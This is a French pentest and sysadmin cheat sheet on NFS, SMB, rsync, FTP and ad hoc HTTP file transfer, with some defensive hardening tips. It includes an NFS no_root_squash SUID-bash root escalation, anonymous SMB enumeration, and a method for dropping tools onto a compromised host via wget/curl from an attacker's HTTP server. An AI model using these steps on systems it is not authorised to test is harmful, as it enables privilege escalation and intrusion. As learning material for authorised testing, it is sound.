# Cheat Sheet : Partage & Transfert de Fichiers — NFS, SMB, rsync, FTP, HTTP

!!! tip "Usage principal"
    Configurer et exploiter les protocoles de partage de fichiers réseau, monter des partages distants et transférer des fichiers rapidement — en administration comme en exfiltration/pivoting pentest.

---

## 1. NFS (Network File System)

### Configuration serveur — `/etc/exports`
```bash
cat /etc/exports   # liste les partages NFS exposés par ce serveur
```

```bash
# Syntaxe : /chemin/partage  client(options)
# Exemple : partage ouvert à tout le réseau 192.168.1.0/24
/srv/data  192.168.1.0/24(rw,sync,no_subtree_check)

# Exemple : partage accessible à tous (risqué)
/srv/public  *(ro,sync)
```

```bash
exportfs -rav   # recharge la config /etc/exports sans redémarrer le service
exportfs -v     # affiche les partages actuellement exportés avec leurs options
```

### Énumération et montage côté client
```bash
# Lister les partages NFS exposés par un hôte distant (aucune authentification requise)
showmount -e 192.168.1.10
```

```bash
# Monter un partage NFS distant en local
mount -t nfs 192.168.1.10:/srv/data /mnt/target
```

```bash
# Démonter proprement
umount /mnt/target
```

### Options NFS courantes

| Option | Rôle |
| --- | --- |
| `rw` | Lecture et écriture |
| `ro` | Lecture seule |
| `sync` | Écriture synchrone (plus sûr) |
| `no_subtree_check` | Désactive la vérification de sous-arborescence (performance) |
| `root_squash` | Mappe l'UID 0 du client sur `nobody` (par défaut, protecteur) |
| `no_root_squash` | **Conserve les droits root du client — vecteur PrivEsc majeur** |
| `all_squash` | Mappe tous les utilisateurs sur `nobody` |

!!! warning "no_root_squash — Élévation de privilèges NFS"
    Quand un partage est exporté avec `no_root_squash`, un client connecté en root peut **créer un binaire SUID sur le partage et l'exécuter avec les droits root** sur la machine cible :
    ```bash
    # Sur le client (root local) : copier bash en SUID sur le partage monté
    cp /bin/bash /mnt/target/bash_suid
    chmod +s /mnt/target/bash_suid
    # Sur le serveur NFS : exécuter la copie en conservant les droits root
    /mnt/target/bash_suid -p   # -p = preserve effective UID
    ```
    En audit : `showmount -e` + lecture de `/etc/exports` → chercher `no_root_squash` sur tout partage accessible.

---

## 2. SMB / Samba

### Configuration serveur — `/etc/samba/smb.conf`
```ini
# Extrait minimal d'un partage Samba
[data]
   path = /srv/samba/data
   browseable = yes
   read only = no
   guest ok = yes           # accès anonyme activé : risque de fuite de données
```

```bash
testparm   # vérifie la syntaxe de smb.conf sans redémarrer le service
```

### Énumération des partages
```bash
# Lister les partages sans authentification (accès anonyme)
smbclient -L //192.168.1.10/ -N
```

```bash
# Lister les partages avec authentification
smbclient -L //192.168.1.10/ -U utilisateur
```

```bash
# Énumération avancée : utilisateurs, groupes, sessions (outil dédié)
enum4linux -a 192.168.1.10
```

### Connexion et transfert de fichiers
```bash
# Connexion à un partage en anonyme
smbclient //192.168.1.10/data -N
```

```bash
# Connexion authentifiée
smbclient //192.168.1.10/data -U utilisateur
```

```bash
# Commandes utiles dans le shell smbclient
# ls             → lister le contenu
# get fichier    → télécharger un fichier
# put fichier    → uploader un fichier
# mget *         → télécharger tous les fichiers
```

### Montage SMB local
```bash
# Monter un partage SMB avec credentials (paquet cifs-utils requis)
mount -t cifs -o username=user,password=pass //192.168.1.10/data /mnt/smb
```

```bash
# Monter avec un fichier de credentials (évite les secrets en clair dans l'historique)
mount -t cifs -o credentials=/etc/.smbcreds //192.168.1.10/data /mnt/smb
```

!!! warning "Partages SMB anonymes et guest ok"
    Un partage Samba avec `guest ok = yes` ou `security = share` est accessible sans identifiant — vecteur classique de fuite de données en interne. `smbclient -L //<IP>/ -N` le confirme en quelques secondes. En Blue Team : désactiver `guest ok`, activer la signature SMB (`server signing = mandatory`) et auditer les partages avec `enum4linux`.

---

## 3. Transferts & Synchronisation

### `rsync` — synchronisation locale et distante
```bash
# Synchronisation locale vers distante via SSH (-a=archive, -v=verbose, -z=compression)
rsync -avz /local/dossier/ user@192.168.1.10:/remote/dossier/
```

```bash
# Synchronisation distante vers locale
rsync -avz user@192.168.1.10:/remote/dossier/ /local/dossier/
```

```bash
# Simulation à sec (dry-run) : voir ce qui serait modifié sans rien toucher
rsync -avz --dry-run /local/ user@remote:/remote/
```

```bash
# Exclure des fichiers/dossiers de la synchronisation
rsync -avz --exclude '*.log' --exclude '.git/' /local/ user@remote:/remote/
```

### Serveurs HTTP ad hoc — partage rapide / exfiltration
```bash
# Serveur HTTP Python dans le répertoire courant (HTTP uniquement, aucune auth)
python3 -m http.server 8080
```

```bash
# Serveur HTTP PHP alternatif (souvent disponible même sans Python)
php -S 0.0.0.0:8000
```

```bash
# Télécharger un fichier exposé depuis la cible (ou depuis l'attaquant)
wget http://192.168.1.10:8080/fichier.sh -O /tmp/fichier.sh
curl http://192.168.1.10:8080/fichier.sh -o /tmp/fichier.sh
```

!!! tip "Serveur HTTP pour le transfert de binaires en pentest"
    Monter un `python3 -m http.server` sur sa machine d'attaque puis faire un `wget` ou `curl` depuis la cible est la méthode la plus rapide pour déposer un outil sur un système compromis — pas de connexion sortante non standard, port 80 ou 443 généralement autorisé en sortie.

### FTP — transfert en ligne de commande
```bash
ftp 192.168.1.10          # connexion interactive FTP
```

```bash
# Commandes dans le shell FTP
# open IP    → connexion à un serveur
# get fich   → télécharger un fichier
# put fich   → uploader un fichier
# binary     → mode binaire (obligatoire pour les fichiers non-texte)
# bye / quit → fermer la connexion
```

```bash
# Télécharger un fichier FTP sans client interactif (mode non-passif si filtré)
wget --no-passive-ftp ftp://user:pass@192.168.1.10/fichier.txt
```

## Synthèse — Tableau des méthodes de transfert

| Méthode | Commande clé | Auth | Chiffré | Usage typique |
| --- | --- | --- | --- | --- |
| NFS | `mount -t nfs` | Non (IP/export) | Non | LAN Linux/Unix |
| SMB | `smbclient` / `mount -t cifs` | Oui (optionnel) | Non (sauf SMB3) | LAN Windows/mixte |
| rsync + SSH | `rsync -avz -e ssh` | Oui (SSH) | Oui | Sauvegarde / sync sécurisée |
| HTTP Python | `python3 -m http.server` | Non | Non | Transfert rapide en lab/pentest |
| FTP | `ftp` / `wget` | Oui | Non | Legacy, souvent filtré |
